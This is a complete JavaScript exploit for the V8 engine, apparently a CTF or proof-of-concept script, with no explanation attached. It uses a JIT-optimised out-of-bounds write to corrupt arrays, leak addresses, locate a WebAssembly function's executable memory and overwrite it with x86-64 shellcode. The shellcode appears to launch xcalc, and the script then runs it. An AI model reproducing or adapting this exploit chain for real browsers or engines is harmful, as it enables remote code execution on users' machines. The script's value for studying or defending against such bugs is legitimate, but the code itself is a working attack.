var buff = new ArrayBuffer(0x8);
var int_ = new Uint32Array(buff);
var flo_ = new Float64Array(buff);

function ftoi(data){
	flo_[0] = data;
	return int_[1]*0x100000000 + int_[0];
}

function itof(data){
	int_[1] = data/0x100000000;
	int_[0] = data&0xffffffff;
	return flo_[0];
}

function itos(data){
	return '0x' + data.toString(16);
}

function opt_r(){
	var x = arguments.length;
	//a1 = new Array(4);
	a1 = [1.1,1,1,1];        //packed / hole element
	double_all = [1.1,0x12345678,0x87654321,1];
	a1[0] = 1.1;           //a[1] = 1.1;   is not permmit
	a1[(x >> 16) * 17] = itof(0x100000000000);//0x1000
	return a1[(x >> 16) * 4];
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var f = wasmInstance.exports.main;

var a1 = undefined;
var double_all = undefined;
var data1 = [4,1];
var data2 = [4,1.1];
data2.length = 65536;
data2.fill(1.1);

//gc();

for (var i = 0; i < 100000; i++) {
	opt_r.apply(null,data1);
}

var double_map = ftoi(opt_r.apply(null,data2));
var obj_map = double_map + 160
print('[*] double map : '+itos(double_map));
//print(itos(ftoi(double_all[4])));

var obj_all = [f,f,f,f];
var leak_arr = [1.1,0xaaaaaa];
var rw_buff = new ArrayBuffer(0x100);
var dataview = new DataView(rw_buff,0);
var idx = 0;

for (var i = 0; i < double_all.length; i++) {
	if(double_all[i] == 1.1 && double_all[i+1] == 0xaaaaaa){
		idx = i;
	}
}

var f_idx = idx - 6;
var back_idx = idx + 10;

double_all[f_idx] = itof(double_map);
var f_addr = ftoi(obj_all[0]);

double_all[back_idx] = itof(f_addr-1);
var f_1_addr = ftoi(dataview.getFloat64(24,true));

double_all[back_idx] = itof(f_1_addr-1);
var f_2_addr = ftoi(dataview.getFloat64(8,true));

double_all[back_idx] = itof(f_2_addr-1);
var f_3_addr = ftoi(dataview.getFloat64(16,true));

double_all[back_idx] = itof(f_3_addr-1);
var rw_addr = ftoi(dataview.getFloat64(232,true));

double_all[back_idx] = itof(rw_addr);

var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

for (var i = 0; i < shellcode.length; i++) {
	dataview.setUint32(i*4,shellcode[i],true);
}

print(itos(ftoi(double_all[back_idx])));
print(itos(rw_addr));

f();
//%DebugPrint(a1);
//%DebugPrint(double_all);
//%DebugPrint(obj_all);
//%DebugPrint(rw_buff);
//%SystemBreak();